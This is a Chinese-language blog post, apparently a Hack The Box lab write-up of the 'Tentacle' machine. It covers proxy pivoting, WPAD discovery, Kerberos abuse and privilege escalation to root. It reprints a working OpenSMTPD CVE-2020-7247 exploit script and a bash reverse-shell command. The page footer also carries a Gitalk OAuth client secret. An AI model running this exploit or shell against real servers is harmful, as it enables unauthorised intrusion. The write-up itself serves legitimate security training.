@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Tentacle - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Tentacle靶场信息   靶场类型   信息搜集 使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.224   我们可以看到，开启了22、53、88、3128、9090几个端口 首先让我们看看3128端口吧，这个端口是Squid代理的默认端口，我也是第一次遇到，比较感兴趣   这里报错了，但是给出了一个域名realcorp.htb 经">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tentacle - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Tentacle靶场信息   靶场类型   信息搜集 使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.224   我们可以看到，开启了22、53、88、3128、9090几个端口 首先让我们看看3128端口吧，这个端口是Squid代理的默认端口，我也是第一次遇到，比较感兴趣   这里报错了，但是给出了一个域名realcorp.htb 经">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/dd553def-8ccf-4f8d-a192-6dada7287ee2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/16877a67-dd27-4220-a9d2-0e3bd0ffe700.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/4998f833-19d7-412e-9162-c879ea7132d8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/47abfa67-0cc4-4e56-afc5-ca6331045ae1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/13bc0799-07f8-48b3-afb0-9b97c320959c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/28ac6333-75e6-43ea-b787-631fa379b5b4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/9a2a412c-b84e-489e-a65b-9b241886ae4c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/9d3a9fb7-3097-4b75-aa62-08b6505df4c5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/47a3aad3-68b8-430b-9e96-73f5814c8941.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/01b4ca16-4eb6-445e-ac6b-beda94744b6b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/2a4517a2-7e62-45d5-a716-1204b7fbd61b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/e4c6f6ba-9d9a-446c-b965-476760d55caa.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/c6cab9b3-2a6d-4059-b495-6e8130ae7e81.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/489f8aaa-cc10-4e70-a7dc-8878857a4cd1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/b469778a-3b26-4723-bef4-666884c670e0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/a839f162-e579-4351-96ad-a9d5abe497b6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/961663a5-3718-47c3-8b05-bdf6e381f19e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/e58abe5f-065d-479c-bfa5-64bd8c186ed4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/04820eb4-c2c9-47ff-8d16-4c3eebe3ed2d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/2d11b659-8a6b-45ca-aaf3-27530c9b663a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/fa24d878-c942-4469-8805-34c5eb215627.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/683c49b0-2d3d-4086-9d7f-2db4cbd3cb89.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/10ed7528-f8dc-4b2a-8351-96346be8ff81.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/d547029f-56ef-422e-b63f-e0920be31771.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/38c80d5a-d0f5-454f-a554-274352302f4a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/18e4aaa7-102f-4550-af12-775efd3920d7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/883be589-23d8-4539-b49f-abef09b5a22a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/6651e8aa-0c80-4af9-bca0-eb17ec9e3789.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/c63685cf-ead4-4116-be3c-89a3e526d1bc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/e165d589-0720-48ed-905e-359ccbf8f5f3.png">
+<meta property="article:published_time" content="2021-06-16T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:53:43.775Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/dd553def-8ccf-4f8d-a192-6dada7287ee2.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Tentacle - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Tentacle - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-06-16T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-06-16
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Tentacle"><span class="post-toc-text">Hackthebox - Tentacle</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Tentacle"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Tentacle - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-06-16 19:38:36" datetime="2021-06-16T11:38:36.000Z"  itemprop="datePublished">2021-06-16</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Tentacle"><a href="#Hackthebox-Tentacle" class="headerlink" title="Hackthebox - Tentacle"></a>Hackthebox - Tentacle</h1><p><strong>靶场信息</strong></p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/dd553def-8ccf-4f8d-a192-6dada7287ee2.png" class>
+
+<p><strong>靶场类型</strong></p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/16877a67-dd27-4220-a9d2-0e3bd0ffe700.png" class>
+
+<p>信息搜集</p>
+<p>使用nmap进行端口扫描</p>
+<p>nmap -A -sS -sC -sV 10.10.10.224</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/4998f833-19d7-412e-9162-c879ea7132d8.png" class>
+
+<p>我们可以看到，开启了22、53、88、3128、9090几个端口</p>
+<p>首先让我们看看3128端口吧，这个端口是Squid代理的默认端口，我也是第一次遇到，比较感兴趣</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/47abfa67-0cc4-4e56-afc5-ca6331045ae1.png" class>
+
+<p>这里报错了，但是给出了一个域名realcorp.htb</p>
+<p>经过测试，该域名的用法是使用这个域名来进行子域名枚举，这里使用dnsenum进行枚举</p>
+<p>dnsenum –threads 64 –dnsserver 10.10.10.224 -f &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-110000.txt realcorp.htb</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/13bc0799-07f8-48b3-afb0-9b97c320959c.png" class>
+
+<p>ns.realcorp.htb. 259200 IN A 10.197.243.77</p>
+<p>proxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb.</p>
+<p>ns.realcorp.htb. 259200 IN A 10.197.243.77</p>
+<p>wpad.realcorp.htb. 259200 IN A 10.197.243.31</p>
+<p>我们得到了几个域，但是无法直接访问，所以我们使用proxychains4来枚举它</p>
+<p>先让我们编辑一下代理配置文件&#x2F;etc&#x2F;proxychains.conf</p>
+<p>echo “[ProxyList]\nhttp 10.10.10.224 3128\nhttp 127.0.0.1 3128\nhttp 10.197.243.77 3128” &gt; &#x2F;etc&#x2F;proxychains.conf</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/28ac6333-75e6-43ea-b787-631fa379b5b4.png" class>
+
+<p>设置好以后，使用nmap进行扫描</p>
+<p>proxychains -f &#x2F;etc&#x2F;proxychains.conf nmap -sT -Pn 10.197.243.31</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/9a2a412c-b84e-489e-a65b-9b241886ae4c.png" class>
+
+<p>经过非常漫长的等待以后，咱们发现开启了这几个端口</p>
+<p>我们可以看到，有一个80端口开着，咱们通过代理去访问看看</p>
+<p>proxychains firefox wpad.realcorp.htb</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/9d3a9fb7-3097-4b75-aa62-08b6505df4c5.png" class>
+
+<p>无法被访问</p>
+<p>咱们添加一个本地解析</p>
+<p>echo 10.197.243.31 wpad.realcorp.htb &gt; &#x2F;etc&#x2F;hosts</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/47a3aad3-68b8-430b-9e96-73f5814c8941.png" class>
+
+<p>再次访问就提示403了，咱们做一个信息搜集看看</p>
+<p>proxychains dirb <a href="http://wpad.realcorp.htb/" target="_blank" rel="noopener">http://wpad.realcorp.htb/</a></p>
+<p>经过漫长的等待后，并没有获得什么有用的信息。</p>
+<p>然后我把着眼点放到了子域名上</p>
+<p>wpad，我去google了一下</p>
+<p>发现有一个wpad.dat的文件，咱们去试试能不能下载下来</p>
+<p>proxychains firefox <a href="http://wpad.realcorp.htb/wpad.dat" target="_blank" rel="noopener">http://wpad.realcorp.htb/wpad.dat</a></p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/01b4ca16-4eb6-445e-ac6b-beda94744b6b.png" class>
+
+<p>OK 存在这个文件，并且可以下载</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/2a4517a2-7e62-45d5-a716-1204b7fbd61b.png" class>
+
+<p>WPAD协议分析及内网渗透利用</p>
+<p><a href="https://xz.aliyun.com/t/1739#toc-9" target="_blank" rel="noopener">https://xz.aliyun.com/t/1739#toc-9</a></p>
+<p>在我自己测试的时候，第一个段10.197.243.0&#x2F;24这个IP段，咱们可以跳过</p>
+<p>在扫描第二个IP段10.241.251.0&#x2F;24的时候，经过了大量的信息搜集，发现10.241.251.113开启了smtp端口，因为我已经做过一次了，就不做重复用工，直接扫描113这台机器</p>
+<p>proxychains -f &#x2F;etc&#x2F;proxychains.conf nmap -sT -sV -Pn 10.241.251.113</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/e4c6f6ba-9d9a-446c-b965-476760d55caa.png" class>
+
+<p>我们可以看到，113这台机器开启了25端口，也就是smtp服务</p>
+<p><strong>漏洞利用</strong></p>
+<p>可以看到这里使用的是OpenSMTPD，咱们去搜索一下相关的漏洞</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/c6cab9b3-2a6d-4059-b495-6e8130ae7e81.png" class>
+
+<p>咱们找到了一个CVE-2020-7247</p>
+<p><a href="https://www.exploit-db.com/exploits/47984" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47984</a></p>
+<p>咱们简单修改一下Exploit</p>
+<p>#!&#x2F;usr&#x2F;bin&#x2F;env python3</p>
+<p>import socket, time</p>
+<p>import sys</p>
+<p>if len(sys.argv) &lt; 4:</p>
+<p>print(“usage: exploit.py   “)</p>
+<p>exit()</p>
+<p>HOST &#x3D; sys.argv[1]</p>
+<p>PORT &#x3D; int(sys.argv[2])</p>
+<p>rev_shell_cmd &#x3D; sys.argv[3]</p>
+<p>payload &#x3D; b”””\r\n</p>
+<p>#0\r\n</p>
+<p>#1\r\n</p>
+<p>#2\r\n</p>
+<p>#3\r\n</p>
+<p>#4\r\n</p>
+<p>#5\r\n</p>
+<p>#6\r\n</p>
+<p>#7\r\n</p>
+<p>#8\r\n</p>
+<p>#9\r\n</p>
+<p>#a\r\n</p>
+<p>#b\r\n</p>
+<p>#c\r\n</p>
+<p>#d\r\n</p>
+<p>“”” + rev_shell_cmd.encode() + b”””</p>
+<p>.</p>
+<p>“””</p>
+<p>for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):</p>
+<p>af, socktype, proto, canonname, sa &#x3D; res</p>
+<p>try:</p>
+<p>s &#x3D; socket.socket(af, socktype, proto)</p>
+<p>except OSError as msg:</p>
+<p>s &#x3D; None</p>
+<p>continue</p>
+<p>try:</p>
+<p>s.connect(sa)</p>
+<p>except OSError as msg:</p>
+<p>s.close()</p>
+<p>s &#x3D; None</p>
+<p>continue</p>
+<p>break</p>
+<p>if s is None:</p>
+<p>print(“Could not open socket”)</p>
+<p>sys.exit(1)</p>
+<p>with s:</p>
+<p>data &#x3D; s.recv(1024)</p>
+<p>print(‘Received’, repr(data))</p>
+<p>time.sleep(1)</p>
+<p>print(‘SENDING HELO’)</p>
+<p>s.send(b”helo test.com\r\n”)</p>
+<p>data &#x3D; s.recv(1024)</p>
+<p>print(‘RECIEVED’, repr(data))</p>
+<p>s.send(b”MAIL FROM:&lt;;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;&gt;\r\n”)</p>
+<p>time.sleep(1)</p>
+<p>data &#x3D; s.recv(1024)</p>
+<p>print(‘RECIEVED’, repr(data))</p>
+<p>s.send(b”RCPT TO:<a href="mailto:&#106;&#46;&#x6e;&#x61;&#x6b;&#97;&#x7a;&#97;&#119;&#97;&#64;&#x72;&#101;&#97;&#x6c;&#x63;&#111;&#114;&#112;&#x2e;&#x68;&#x74;&#98;">j.nakazawa@realcorp.htb</a>\r\n”)</p>
+<p>data &#x3D; s.recv(1024)</p>
+<p>print(‘RECIEVED’, repr(data))</p>
+<p>s.send(b”DATA\r\n”)</p>
+<p>data &#x3D; s.recv(1024)</p>
+<p>print(‘RECIEVED’, repr(data))</p>
+<p>s.send(payload)</p>
+<p>data &#x3D; s.recv(1024)</p>
+<p>print(‘RECIEVED’, repr(data))</p>
+<p>s.send(b”QUIT\r\n”)</p>
+<p>data &#x3D; s.recv(1024)</p>
+<p>print(‘RECIEVED’, repr(data))</p>
+<p>print(“Exploited”)</p>
+<p>s.close()</p>
+<p>保存为exploit.py后，本地使用nc开启一个端口监听</p>
+<p>nc -nvlp 4444</p>
+<p>使用proxychains4代理运行该脚本</p>
+<p>proxychains4 python3 expliot.py 10.241.251.113 25 ‘bash -c “exec bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.2&#x2F;4444 &lt;&amp;1”‘</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/489f8aaa-cc10-4e70-a7dc-8878857a4cd1.png" class>
+
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/b469778a-3b26-4723-bef4-666884c670e0.png" class>
+
+<p>成功拿到一个shell，并且直接就是root权限</p>
+<p>但是这个shell是smtp的root，并不是系统的root，咱们还要想办法提权</p>
+<p><strong>权限提升</strong></p>
+<p>咱们进入&#x2F;home目录查看一下</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/a839f162-e579-4351-96ad-a9d5abe497b6.png" class>
+
+<p>有一个j.nakazawa目录，咱们进去找一下有没有用的东西</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/961663a5-3718-47c3-8b05-bdf6e381f19e.png" class>
+
+<p>我们在里面找到一个.msmtprc文件，咱们查看一下</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/e58abe5f-065d-479c-bfa5-64bd8c186ed4.png" class>
+
+<p>咱们得到了用户j.nakazawa的账号密码</p>
+<p>USERNAME &#x3D; j.nakazawa</p>
+<p>PASSWORD &#x3D; sJB}RM&gt;6Z~64_</p>
+<p>但这个用户无法直接登录ssh，所以咱们还得想办法来利用</p>
+<p>各位还记得10.10.10.224这台机器上 3128端口中另一个线索吗</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/04820eb4-c2c9-47ff-8d16-4c3eebe3ed2d.png" class>
+
+<p>没错，就是这个srv01.realcorp.htb，咱们将它加入到hosts里</p>
+<p>echo 10.10.10.224 srv01.realcorp.htb &gt; &#x2F;etc&#x2F;hosts</p>
+<p>记得确保hosts文件中只有这一台主机，输入上面的指令即可</p>
+<p>然后我们使用kerbos生成票据进行登录</p>
+<p>apt install krb5-user</p>
+<p>然后咱们修改对应配置</p>
+<p>vim &#x2F;etc&#x2F;krb5.conf</p>
+<p>[libdefaults]</p>
+<p>default_realm &#x3D; REALCORP.HTB</p>
+<p>[realms]</p>
+<p>REALCORP.HTB &#x3D; {</p>
+<p>kdc &#x3D; 10.10.10.224</p>
+<p>}</p>
+<p>[domain_realm]</p>
+<p>srv01.realcorp.htb &#x3D; REALCORP.HTB</p>
+<p>分别填入对应位置即可</p>
+<p>然后咱们去生成票据</p>
+<p>kinit j.nakazawa</p>
+<p>password：sJB}RM&gt;6Z~64_</p>
+<p>然后咱们检查一下可用的票据</p>
+<p>klist</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/2d11b659-8a6b-45ca-aaf3-27530c9b663a.png" class>
+
+<p>OK，确定生成成功</p>
+<p>然后咱们使用ssh进行登录</p>
+<p>ssh <a href="mailto:j.nakazawa@10.10.10.224">j.nakazawa@10.10.10.224</a></p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/fa24d878-c942-4469-8805-34c5eb215627.png" class>
+
+<p>登录成功</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/683c49b0-2d3d-4086-9d7f-2db4cbd3cb89.png" class>
+
+<p>成功获得user权限的flag</p>
+<p>咱们查看一下&#x2F;etc&#x2F;crontab</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/10ed7528-f8dc-4b2a-8351-96346be8ff81.png" class>
+
+<p>定时任务发现admin定时运行&#x2F;usr&#x2F;local&#x2F;bin&#x2F;log_backup.sh</p>
+<p>咱们查看一下</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/d547029f-56ef-422e-b63f-e0920be31771.png" class>
+
+<p>我们可以看到，是从squid目录复制文件到admin目录，那么我们如果写入认证文件到squid目录，从而使其被复制到admin目录呢？说干就干</p>
+<p>现在创建一个名为.k5login的文件，并复制到squid目录下</p>
+<p>echo “<a href="mailto:&#x6a;&#x2e;&#x6e;&#97;&#107;&#x61;&#x7a;&#97;&#119;&#97;&#64;&#82;&#69;&#65;&#x4c;&#67;&#x4f;&#82;&#x50;&#x2e;&#72;&#x54;&#66;">&#x6a;&#x2e;&#x6e;&#97;&#107;&#x61;&#x7a;&#97;&#119;&#97;&#64;&#82;&#69;&#65;&#x4c;&#67;&#x4f;&#82;&#x50;&#x2e;&#72;&#x54;&#66;</a>“ &gt;&gt; .k5login</p>
+<p>cp .k5login &#x2F;var&#x2F;log&#x2F;squid</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/38c80d5a-d0f5-454f-a554-274352302f4a.png" class>
+
+<p>然后我们稍等一会儿之后，使用admin的身份来进行登录</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/18e4aaa7-102f-4550-af12-775efd3920d7.png" class>
+
+<p>OK，成功拿到admin权限</p>
+<p>但是我发现，权限还是不够，咱们还不是root权限，还得提。。。</p>
+<p>好家伙，这得提三次权也是没谁了</p>
+<p>咱们使用klist查看一下&#x2F;etc&#x2F;krb5.keytab这个文件</p>
+<p>klist -k &#x2F;etc&#x2F;krb5.keytab</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/883be589-23d8-4539-b49f-abef09b5a22a.png" class>
+
+<p>咱们发现了有很多个Kerberos的加密密钥</p>
+<p>咱们使用kadmin进行利用</p>
+<p>kadmin -k -t &#x2F;etc&#x2F;krb5.keytab -p <a href="mailto:kadmin/admin@REALCORP.HTB">kadmin&#x2F;admin@REALCORP.HTB</a></p>
+<p>add_principal <a href="mailto:root@REALCORP.HTB">root@REALCORP.HTB</a></p>
+<p>然后自己设置一个密码即可</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/6651e8aa-0c80-4af9-bca0-eb17ec9e3789.png" class>
+
+<p>然后使用ksu切换到root即可</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/c63685cf-ead4-4116-be3c-89a3e526d1bc.png" class>
+
+<p>成功提权到root</p>
+<img src="/2021/06/16/Hackthebox/Hackthebox-Tentacle/e165d589-0720-48ed-905e-359ccbf8f5f3.png" class>
+
+<p>成功拿到root权限的flag</p>
+<p>收工睡觉</p>
+<p>哎，目前在线的easy和medium都打完了，今天开始只能打hard难度的了，难顶啊</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/&title=《Tentacle - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/&title=《Tentacle - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Tentacle - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/06/16/Hackthebox/Hackthebox-Tentacle/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/06/17/Hackthebox/Hackthebox-Spider/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Spider - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/06/15/Hackthebox/Hackthebox-Dynstr/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Dynstr - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
